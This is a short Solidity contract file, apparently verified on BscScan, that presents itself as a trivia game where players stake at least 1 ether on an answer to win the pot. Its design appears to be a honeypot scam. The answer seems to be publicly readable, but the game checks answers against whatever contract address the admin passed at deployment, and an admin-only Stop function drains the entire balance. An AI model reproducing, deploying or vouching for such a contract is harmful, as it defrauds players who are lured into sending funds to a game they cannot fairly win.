/**
 *Submitted for verification at BscScan.com on 2021-07-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;


//Welcome to this game created by BSC enthusiasts!

contract Questions
{
    string public question;
    string public response;
    
    constructor(string memory _question,string memory _response) {
       require(bytes(_question).length > 0);
       require(bytes(_response).length > 0);
       question=_question;
       response=_response;
    }

    function getQuestion() public view returns (string memory){
        return question;
    }
    
    function getResponse() public view returns (string memory){
        return response;
    }  
}

contract Trivia2021
{
	//Variables
    Questions cQuestion;
    address admin;
    
	//Modifiers
	modifier isAdmin(){
		require(admin==msg.sender);
		_;
	}
	
    constructor(address _question) {
       cQuestion=Questions(_question);
       admin=msg.sender;
    }
    
	//Getters
    function getQuestion() public view returns (string memory){
        return cQuestion.getQuestion();
    }
	
    function init(address _question) public payable isAdmin(){
		//Ensure the game has not started
        if(address(cQuestion) == address(0)){
            cQuestion=Questions(_question);
        }
    }
        
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);
        require(msg.value  >= 1 ether);
        require(bytes(_response).length > 0);
        //If response is Okay!
        if(keccak256(bytes(_response)) == keccak256(bytes(cQuestion.getResponse())))
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external {}
}